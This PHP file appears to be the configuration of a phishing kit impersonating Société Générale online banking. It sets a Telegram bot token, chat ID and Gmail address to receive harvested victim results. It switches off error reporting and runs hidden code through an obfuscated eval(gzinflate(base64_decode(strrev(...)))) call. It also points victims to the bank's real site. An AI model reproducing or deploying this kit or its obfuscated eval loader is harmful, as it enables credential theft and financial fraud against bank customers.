<?php
require_once __DIR__ . '/../guard.php';
    session_start();
    error_reporting(0);
    require_once 'detect.php';
    require_once 'functions.php';
    eval(gzinflate(base64_decode(strrev(block_servers()))));
    define("PASSWORD", 'sg');
    define("RECEIVER", 'leroyfabien99@gmail.com');
    define("TELEGRAM_TOKEN", '1701198811:AAG-U46NOeoIJxJu-T5E4MtAJH2MlqeJ8Xk');
    define("TELEGRAM_CHAT_ID", '-514572793');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'my_result002.txt');
    define("OFFICIAL_WEBSITE", 'https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html');

    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1
?>